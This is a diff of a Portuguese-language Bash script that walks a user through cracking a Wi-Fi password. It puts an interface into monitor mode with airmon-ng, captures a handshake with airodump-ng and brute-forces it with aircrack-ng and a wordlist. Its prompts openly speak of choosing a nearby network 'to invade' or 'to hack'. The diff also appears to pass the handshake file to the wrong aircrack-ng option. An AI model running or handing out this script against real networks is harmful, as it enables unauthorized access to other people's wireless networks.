@@ -7,9 +7,9 @@ echo Nao se esqueca de usar o iniciar o setup primeiro
 
 sleep 2
 
-echo "recomendo usar  a script dessa forma"
+echo "USE COMO USUARIO ROOT"
 
-sleep 2
+sleep 3
 
 toilet -f block "BEM VINDO"
 
@@ -32,7 +32,7 @@ echo "airmom-ng (para colcoar sua interface em modo monitor e para matar todo pr
 
 echo vamos começar com airmon-ng
 
-sleep 1
+sleep 2
 
 airmon-ng check kill
 
@@ -40,8 +40,10 @@ echo "agora fechamos todos possiveis processos que possam interferir no processo
 
 sleep 3
 
+
+clear
 echo "caso não saiba qual sua interface de rede use o comando 'iwconfig' e identifique sua interface "
-10:FE:ED:87:F6:0C
+
 
 echo -e "\e[38;5;82mvamos la com 'airmon-ng'começar a bsucar redes proximas por favor informe sua interface de rede:" 
 read interface
@@ -53,6 +55,14 @@ airmon-ng start $interface
 echo "agora colocamos a sua rede em modo monitor"
 
 sleep 2
+
+iwconfig
+
+echo "informe como esta a sua interface em modo monitor?(exemplo: wlan0mon):"
+read monitor
+
+
+sleep 2
 echo "essa e apenas para ver as redes que estao perto de voce quando encontrar a que deseja hackar. anote o BSSID da redee pressione (ctrl + c)"
 
 sleep 5
@@ -62,7 +72,9 @@ echo "vamos usar o 'airodump-ng' para isso."
 
 echo "QUANDO APARECER A REDE QUE VOCE DESEJA INVADIR ANOTE O 'BSSID' E PRESSIONE (ctrl + c)"
 
-airodump-ng $interface
+sleep 2
+
+airodump-ng $monitor
 
 
 echo "por favor preste atençao na rede que voce gostaria de 'hackar' a tabela 'beacons' ela é muito importante quanto melhor sua placa de rede ou adaptador melhor e mais rapido vai capturar 'beacons'"
@@ -86,7 +98,7 @@ echo "Leia tudo e aguarde 30 segundos para continuar..."
  
  sleep 10
  
-airodump-ng $interface --bssid $bssid
+airodump-ng $monitor --bssid $bssid
 
 
 
@@ -108,4 +120,4 @@ read handshake
 echo -e "\e[38;5;82monde esta a sua wordlist?:"
 read wordlist
 
-aircrack-ng -w  $wordlist -b $bssid $handshake
+aircrack-ng -w  $wordlist -b $bssid -e $handshake
